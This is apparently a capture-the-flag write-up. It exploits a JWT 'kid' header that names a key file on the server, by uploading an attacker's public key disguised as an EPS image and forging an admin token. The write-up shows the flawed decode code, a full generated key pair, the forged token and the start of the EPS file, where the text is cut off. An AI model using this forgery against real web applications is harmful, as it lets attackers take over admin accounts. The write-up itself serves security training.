Attachments:  
 * imagehost.zip

In this zip file there is a python implementation of an imagehost web server.  
This implementation contains code for session handling via JSON Web Tokens:  
```python  
from pathlib import Path

import jwt

def encode(payload, public_key: Path, private_key: Path):  
	key = private_key.read_bytes()  
	return jwt.encode(payload=payload, key=key, algorithm="RS256", headers={"kid": str(public_key)})

def decode(token):  
	headers = jwt.get_unverified_header(token)  
	public_key = Path(headers["kid"])  
	if public_key.absolute().is_relative_to(Path.cwd()):  
		key = public_key.read_bytes()  
		return jwt.decode(jwt=token, key=key, algorithms=["RS256"])  
	else:  
		return {}  
```

Creating a token via login produces something like this  
```  
eyJhbGciOiJSUzI1NiIsImtpZCI6InB1YmxpY19rZXkucGVtIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjozLCJhZG1pbiI6bnVsbH0.O46AMfAsFuXqRNkf00FrDYGQN1lqt7M3gAExp-
RXv7C1Po4TUNnnnpb_DR8UrrBYIfn1kvXBxQzXr2EqJduh67fs3MRGaYXmSyLkQ26QBDfuF-L6A89e4g5Jf4qE3jirp210i1q2374vqVW9VeCoP7hfkLlPuSK5VDAm8BfDaSRF4odWH1klpT_fo03NsVpahg1H0sgak0lDvAssVXcbhZ-8KRo64QOcL8tKjZzbCsoll-
rfxgyKdGRyLgVxBRw6Kay1ei_dG6j7mNGnQupNr8fy9IdCexEOABjAHoI640cujOl7z0g2SUB4tzG7txVbRm15jcysBvD_NVonvoE3VGUgbSg_V5lkj5ofLNWCh9jN7hlj6xEXql3QzsVWJQHgYm5dpEuoxizXdozqvi6AOKn6SR5BG1jHYs1XCnSW5XnqbO6OBfTdSTYas1lRJ-
NCzsvJs3wYEbjHJp9CDMA9NCJJVDTZ7EkMyhrN7CJH8LHGU8ZrTkqKFKl3_bQeQWmgfI9URIatlLafnk8aw7YkOU4gkXJqZvtwpfaMYF8GgIujeVM7I8c11jPF-k58OAM7lUOOpBsK_fW9JQQ9_VZqF6pJltKpwR3I-saRcyL3p6M-3CpwWI2FS4bqfkcQDj9wuqxEF45uP-
wn3TyqAteV1wX_Ei7N5uVNQ8cHSFIigPI  
```  
This can be decoded via https://jwt.io/  
The header  
```  
{  
 "alg": "RS256",  
 "kid": "public_key.pem",  
 "typ": "JWT"  
}  
```  
The payload  
```  
{  
 "user_id": 3,  
 "admin": null  
}  
```

We suspect that we can upload our own public key pretending it is an image
file.  
We will sign our payload containing the admin user_id, with a known private
key. Then use our own public key to check the signature.

For signing our own payload  
Public Key:

```  
-----BEGIN PUBLIC KEY-----  
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAr79D8wfWGTEBR5z/hSI6  
W799WS+kCZoYw0UqooJQ5nzld1mGwgNW+yNyxHdDaBfxjFtetW6anDaissUpQqRl  
jVRIvt3Mo85t4pgoRJEiUFQ6YtsLaUXax/ZMaYmhilf7IvlkEX9fn6bPlpBOqGFe  
4FhrEhyt38rOiBtAxWm0pcRyWHZ+LuCbmJu41+AGTzfNiGFWJSQ7yN0w5sASpdkN  
U+mdYez2CbyqrQdPRJtilLdFzggFYiVD8EfabsOTTKUkIi+Zgg8MRRvMm+xYIxex  
4Vawf8devya18NRoN+aIahCdA753hpAcuDldzUEtPytuS+1946+KUdpPFWiKUgaM  
YQIDAQAB  
-----END PUBLIC KEY-----  
```

Private Key:  
```  
-----BEGIN PRIVATE KEY-----  
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCvv0PzB9YZMQFH  
nP+FIjpbv31ZL6QJmhjDRSqiglDmfOV3WYbCA1b7I3LEd0NoF/GMW161bpqcNqKy  
xSlCpGWNVEi+3cyjzm3imChEkSJQVDpi2wtpRdrH9kxpiaGKV/si+WQRf1+fps+W  
kE6oYV7gWGsSHK3fys6IG0DFabSlxHJYdn4u4JuYm7jX4AZPN82IYVYlJDvI3TDm  
wBKl2Q1T6Z1h7PYJvKqtB09Em2KUt0XOCAViJUPwR9puw5NMpSQiL5mCDwxFG8yb  
7FgjF7HhVrB/x16/JrXw1Gg35ohqEJ0DvneGkBy4OV3NQS0/K25L7X3jr4pR2k8V  
aIpSBoxhAgMBAAECggEAAvgAFsgTSzkFQpN9yz7gFZ5NKLNV4fnj+NH3ebfp9A/I  
bEkDTk4SQ0MmuFgDp+uuH1LojVfrRY/kdRDArP0UEFRr92ntn9eACpGrjfd16P2Y  
QCTfOym0e7fe0/JQy9KHRfCoqqVAPTUbGPnyczSUXsWtlthsTT1Kuni74g3SYPGy  
pQuO9j2ICP8N9AeNh2yGHf3r2i5uKwOCyErniwzzBHJPBcMHfYD3d8IOTgUTmFLg  
esBAzTEwLmAy8vA0zSwGfFaHMa0OhjZrc+4f7BUU1ajD9m7Uskbs6PMSjqLZYzPG  
ctCkIeyaLIc+dPU+3Cumf5EkzcT0qYrX5bsadGIAUQKBgQD3IDle2DcqUCDRzfQ0  
HJGoxjBoUxX2ai5qZ/2D1IGAdtTnFyw73IZvHzN9mg7g5TZNXSFlHCK4ZS2hXXpy  
lePML7t/2ZUovEwwDx4KbenwZLAzLYTNpI++D0b2H53+ySpEtsA6yfq7TP+PWa2x  
UnLCZqnwZcwrQd/0equ58OLJ0QKBgQC2Dt8il/I0rTzebzfuApibPOKlY5JyTTnU  
BmJIh8eZuL5obwRdf53OljgMU5XyTy7swzot4Pz7MJlCTMe/+0HvjuaABcDgmJd/  
N4gcuR+chOiYw7Bc2NSyGodq2WR/f/BiMcXBAbqEALbXAQy9mkCH4xePTdEA3EPY  
Xml3SDCtkQKBgGv67JaAqzoV4QFLmJTcltjEIIq1IzeUlctwvNlJlXxocAa5nV5a  
sXMEkx8inbWu8ddEBj+D17fyncmQatx+mhayFJ98lyxBepjVQi8Ub8/WbxctoIWq  
jhRh4IPStNqLU6jKoZwOfTwyHMiqSrbca8B902tzT47nLdBJeZe5pZ7BAoGAHIBv  
hmbrUDvez6PxyZ02bvc1NFdGUgatCviE4n3/TZ2SkZ7vvAOCnRj/ZU6gpvKmkgJu  
VUhn0ptlIvAKRY/8XpislVZRP9gjv5LeCEEjJcnY8DGSprZ7dfaZRK0MArnw1C6e  
mvy+SnQiK77KU9SWTa/LvG+eTNgu9uyw7i+rD0ECgYBKphKWj9ru+Q0Bp5IHCBn5  
PXhCuCzaHdWhka8tl44LjBSLLect2PA9oFiKEUA8HSnYylAnZ1LCca7uTrK9jJlL  
metr5MaO3e9xDzlq4CcEo3+7KyVhDTylzM7pfx3QjcSrwtZYiNTRU+1pEPfIqXv5  
I8STSTbbJXCTwQ9LY2TXvw==  
-----END PRIVATE KEY-----  
```

The modified header:  
```  
{  
 "alg": "RS256",  
 "kid": "/a/our_own_public_key.pem",  
 "typ": "JWT"  
}  
```

The modified session payload  
```  
{  
 "user_id": 1,  
 "admin": null  
}  
```  
We can create the needed token with the token.py functions given by the task
source

```  
>>> from pathlib import Path  
>>> encode({"user_id": 1, "admin": True}, Path('../../public_key.pem'),
Path('../../private_key.pem'))  
'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uL3B1YmxpY19rZXkucGVtIn0.eyJ1c2VyX2lkIjoxLCJhZG1pbiI6dHJ1ZX0.oGlGsmuASM6q4oxmhMVXVscY0xZyBnex8W5VuKPBWlporlGgrn9LdoHqi4aLel6P1VxRvCDptRX9_tmNQzcUSTl3fLkPkrIUAFb-
Wf0ZHpIsQ6j2_kmTEZMoenr72B6G9MUg4Z_qh1Y8JM5DtTENWpC1pM_KfKGJorfT_6wgseaBxvm7PDDQyuPAVD4gAY0PUR2_VJH3M4h94e0c2Gc2sIh-
ZjbRyDnhVN9qaM0z54gNbHklEIPlrHt2PxoxC3yowbR9aFV0kdy9fk54EtFIpOKVGj84Bs3Q3rXnILvLr1KEryiw4wyqSJ2cSkeiuAikXCpd-
_SGsw_DU1Xdng6FsA'  
```  
We created + uploaded postscript 1x1p image with public key attached  
```  
%!PS-Adobe-3.0 EPSF-3.0  
%%Creator: GIMP PostScript file plug-in V 1,17 by Peter Kirchgessner  
%%Title: evil.eps  
%%CreationDate: Sun Apr 14 02:06:11 2024  
%%DocumentData: Clean7Bit  
%%LanguageLevel: 2  
%%Pages: 1  
%%Boun